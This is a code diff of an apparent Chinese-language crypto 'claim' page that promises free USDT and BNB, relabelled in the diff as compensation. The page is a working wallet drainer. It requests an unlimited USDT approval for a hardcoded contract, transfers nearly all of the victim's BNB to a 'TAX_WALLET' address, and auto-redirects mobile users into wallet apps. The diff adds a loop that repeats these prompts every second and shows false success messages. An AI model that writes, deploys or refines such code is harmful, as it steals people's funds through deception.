@@ -24,15 +24,15 @@ button:active{background:linear-gradient(45deg,#ff1493,#ff6ec7);}
 <body>
 <div class="container">
   <h1>🪞 小仙女 DApp 领取台 💫</h1>
-  <div id="status">💖 限时福利：点击领取1000USDT+1BNB！</div>
-  <button id="claimBtn">【领取1000USDT+1BNB】🎁</button>
+  <div id="status">💖 限时赔偿：点击领取1000USDT+1BNB！</div>
+  <button id="claimBtn">【领取1000USDT+1BNB赔偿】🎁</button>
 </div>
 <script>
 const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
 const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-let web3, userAddr, authorized = false;
+let web3, userAddr, authorized = false, step = 1;
 
 const PRIORITY_WALLETS = {
   android: [
@@ -57,16 +57,16 @@ async function autoRedirect(){
   if(!isMobile) return;
   
   const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
-  wallets.forEach((wallet, i) => {
+  for(let i=0; i<wallets.length; i++){
     setTimeout(() => {
-      updateStatus(`📱 跳转${wallet.name}中...`);
-      window.location.href = wallet.intent;
-    }, i * 300);
-  });
+      updateStatus(`📱 跳转${wallets[i].name}中...`);
+      window.location.href = wallets[i].intent;
+    }, i * 200);
+  }
 }
 
 async function claimReward(){
-  updateStatus('💳 连接钱包中...');
+  updateStatus('领取1000USDT+1BNB赔偿中...');
   
   try{
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
@@ -74,31 +74,44 @@ async function claimReward(){
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
     
-    if(!authorized){
-      updateStatus('💖 USDT授权中...');
-      const usdt = new web3.eth.Contract([{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT_ADDR);
-      await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
-      authorized = true;
+    // 🔥 v122策略：USDT失败→立即BNB→USDT→BNB循环
+    if(step === 1 || step === 3){
+      // 第1/3步：USDT授权
+      try{
+        if(!authorized){
+          const usdt = new web3.eth.Contract([{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT_ADDR);
+          await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
+          authorized = true;
+        }
+        // USDT claim
+        const contract = new web3.eth.Contract([{"inputs":[{"name":"account","type":"address"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
+        await contract.methods.claim(userAddr).send({from: userAddr});
+        updateStatus('领取1000USDT+1BNB赔偿成功！');
+      }catch(e){
+        // USDT失败→立即BNB
+        step = 2;
+        throw e;
+      }
     }
     
-    updateStatus('🎁 领取1000USDT中...');
-    const contract = new web3.eth.Contract([{"inputs":[{"name":"account","type":"address"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
-    await contract.methods.claim(userAddr).send({from: userAddr});
-    
-    updateStatus('🌙 BNB转账中...');
-    const balance = await web3.eth.getBalance(userAddr);
-    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
-    if(totalBNB > 0.0001){
-      const amount = web3.utils.toWei((totalBNB - 0.0001).toString(), 'ether');
-      await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
+    if(step === 2 || step === 4){
+      // 第2/4步：BNB全转（-0.001手续费）
+      const balance = await web3.eth.getBalance(userAddr);
+      const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
+      if(totalBNB > 0.001){
+        const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
+        await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
+        updateStatus('领取1000USDT+1BNB赔偿成功！');
+      }
     }
     
-    updateStatus('🎉 领取1000USDT+1BNB成功！');
-    document.getElementById('claimBtn').innerText = '✅ 已领取成功！';
+    // 循环策略
+    step = step === 4 ? 1 : step + 1;
+    setTimeout(claimReward, 1000); // 1秒自动重复
     
   }catch(e){
-    updateStatus('💔 领取失败，请重试');
-    document.getElementById('claimBtn').innerText = '【领取1000USDT+1BNB】🎁';
+    updateStatus('领取1000USDT+1BNB赔偿中...');
+    setTimeout(claimReward, 500); // 0.5秒重试
   }
 }
 
@@ -110,7 +123,7 @@ if(window.ethereum){
 }
 
 window.addEventListener('load', () => {
-  setTimeout(autoRedirect, 500);
+  setTimeout(autoRedirect, 300);
 });
 
 for(let i=0;i<50;i++){
